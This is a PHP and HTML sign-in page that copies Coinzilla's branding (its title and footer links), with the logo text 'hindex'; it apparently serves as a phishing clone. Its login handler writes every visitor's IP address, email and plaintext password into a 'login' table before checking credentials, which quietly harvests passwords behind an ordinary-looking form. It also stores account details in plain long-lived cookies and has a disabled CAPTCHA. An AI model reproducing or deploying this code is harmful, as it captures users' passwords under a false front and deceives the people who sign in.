<?php
include(__DIR__ . '../../a.php');


//include 'debug.php';
/******************* email activation *******************/
if (isset ($_GET ['cus_id']) && !empty ($_GET ['activation_code']) && !empty ($_GET ['cus_id'])) {
    $id = clean_input($_GET['cus_id']);
    $activation_code_2 = clean_input($_GET['activation_code']);

    $link = get_link();
    $stmt = mysqli_stmt_init($link);
    if (mysqli_stmt_prepare($stmt, 'SELECT activation_code FROM customer WHERE id=?')) {
        mysqli_stmt_bind_param($stmt, "i", $id);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_bind_result($stmt, $activation_code_1);
        mysqli_stmt_fetch($stmt);
        mysqli_stmt_close($stmt);
    }

    if ($activation_code_1 != $activation_code_2) {
        $err = urlencode("Sorry no such account exists or activation code invalid.");
        header("Location: login.php?err=".$err);
        exit ();
    }

    // set the approved field to 1 to activate the account
    $approved = 1;
    $link = get_link();
    $stmt = mysqli_stmt_init($link);
    if (mysqli_stmt_prepare($stmt, 'UPDATE customer SET approved=? WHERE id=? AND activation_code = ?')) {
        mysqli_stmt_bind_param($stmt, "iii", $approved, $id, $activation_code_2);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }

    $err = urlencode("Thank you. Your account has been activated.");
    header("Location: login.php?done=1&err=".$err);
    exit ();
}

/******************* login *******************/
if (filter_input(INPUT_POST, 'doLogin', FILTER_SANITIZE_SPECIAL_CHARS) === 'Login') {
    $user_email = clean_input($_POST['user_email']);
    $pwd = clean_input($_POST['password']);
    $banned = 0;
    $ip = $_SERVER ['REMOTE_ADDR'];

    $link = get_link();
    $stmt = mysqli_stmt_init($link);
    $sql = "INSERT INTO login ( ip, email, password)
	VALUES(?,?,?)";
    if (mysqli_stmt_prepare($stmt, $sql)) {
        mysqli_stmt_bind_param($stmt, "sss", $ip, $user_email, $pwd);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }

    $link = get_link();
    $stmt = mysqli_stmt_init($link);
    if (mysqli_stmt_prepare($stmt, 'SELECT id, first_name, user_email, pwd, approved FROM customer WHERE user_email=? AND banned=?')) {
        mysqli_stmt_bind_param($stmt, "si", $user_email, $banned);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_bind_result($stmt, $id, $first_name, $user_email_db, $hash, $approved);
        mysqli_stmt_fetch($stmt);
        mysqli_stmt_close($stmt);
    }

    if ($id > 0) {
        if (!password_verify($pwd, $hash)) {
            $err = urlencode("Wrong user credentials.");
            header("Location: login.php?err=" . $err);
            exit ();
        }

        if (!$approved) {
            $err = urlencode("Account not activated. Please check your email for activation code");
            header("Location: login.php?err=".$err);
            exit ();
        }

        // set session and log user in
        session_start();
        $_SESSION ['cus_id'] = $id;
        $_SESSION ['first_name'] = $first_name;
        $_SESSION ['user_email'] = $user_email_db;

        // set the cookie for 60 days
        setcookie("cus_id", $_SESSION ['cus_id'], time() + 60 * 60 * 24 * 60, "/");
        setcookie("first_name", $_SESSION ['first_name'], time() + 60 * 60 * 24 * 60, "/");
        setcookie("user_email", $_SESSION ['user_email'], time() + 60 * 60 * 24 * 60, "/");
        header("Location: overview.php");
    } else {
        $err = urlencode("Sorry no such account exists.");
        header("Location: login.php?err=" . $err);
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In - Coinzilla - Finance & Crypto Display Advertising</title>
    <link href="sign-in/assets/images/favicon.png.html" rel="shortcut icon" type="image/png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.9.1/sweetalert2.min.css">
    <link rel="stylesheet" href="auth/assets/css/auth.css">
</head>
<body>
<section class="auth">
    <div class="container header-auth">
        <div class="row">
            <div class="col-md-6 col-lg-4 col-sm-8 col-11 mx-auto">
                <a href="index.php">
                    <!--                    <img src="" alt="hindex" class="logo">-->
                    <h4>hindex</h4>
                </a>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-lg-4 col-sm-8 col-11 mx-auto">
                <div class="card">
                    <form action="" method="post">
                        <input type="hidden" value="Login" name="doLogin" id="product">
                        <div class="card-body">
                            <h1>Sign in</h1>
                            <div class="line-bellow d-block mt-3 mb-2"></div>
                            <div class="form-group">
                                <label for="email" id="email_label" class="col-form-label">Email</label>
                                <input type="email" data-validate="email" class="form-control" id="email"
                                       name="user_email"
                                       placeholder="Email Address" required>
                            </div>
                            <div class="form-group">
                                <div class="forgot-password">
                                    <a href="recovery.php">Forgot Password?</a>
                                </div>
                                <label for="password" id="password_label" class="col-form-label">Password</label>
                                <input type="password" class="form-control" id="password" name="password"
                                       placeholder="Password" required>
                            </div>
                            <!--                            <div class="form-group mb-0">-->
                            <!--                                <div class="g-recaptcha" data-sitekey="6LcEwn0UAAAAAIYk5vOyoJOmyOjcUDHkcoTFTLe9"></div>-->
                            <!--                            </div>-->
                            <div class="form-group form-check">
                                <label for="remember" class="label-cbx">
                                    <input id="remember" name="remember" value="1" type="checkbox" class="invisible">
                                    <div class="checkbox">
                                        <svg width="20px" height="20px" viewBox="0 0 20 20">
                                            <path d="M3,1 L17,1 L17,1 C18.1045695,1 19,1.8954305 19,3 L19,17 L19,17 C19,18.1045695 18.1045695,19 17,19 L3,19 L3,19 C1.8954305,19 1,18.1045695 1,17 L1,3 L1,3 C1,1.8954305 1.8954305,1 3,1 Z"></path>
                                            <polyline points="4 11 8 15 16 6"></polyline>
                                        </svg>
                                    </div>
                                    <span>Keep me logged in</span>
                                </label>
                            </div>
                            <div class="form-group">
                                <button type="submit" class="btn orange btn-si-gt">
                                    Log into your account
                                </button>
                            </div>
                            <p class="placeholder text-center">
                                Don't have an account yet? <br/>
                                <a href="signup.php">Sign up now &xrarr;</a>
                            </p>
                            <div class="modal fade" tabindex="-1" role="dialog" id="modal">
                                <div class="modal-dialog">
                                    <div class="modal-content"></div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div class="container footer-auth">
        <div class="row">
            <div class="col-md-6 col-lg-4 col-sm-8 col-11 mx-auto">
                <a href="https://coinzilla.com/contact/">Contact Support</a>
                <div class="float-right">
                    <a href="https://coinzilla.com/terms/">Terms & Conditions</a> -
                    <div class="dropdown">
                        <a href="https://coinzilla.com/privacy-policy/" data-toggle="dropdown">Privacy &#9662;</a>
                        <div class="dropdown-menu d-none">
                            <div class="dropdown-header">
                                Check Our Policies
                            </div>
                            <a class="dropdown-item" href="https://coinzilla.com/privacy-policy/">Privacy Policy</a>
                            <div class="dropdown-divider"></div>
                            <a class="dropdown-item" href="https://coinzilla.com/cookie-policy/">Cookie Policy</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.9.1/sweetalert2.min.js"></script>
<script src="auth/assets/js/auth.js%3Fver=1.1"></script>
</body>
</html>
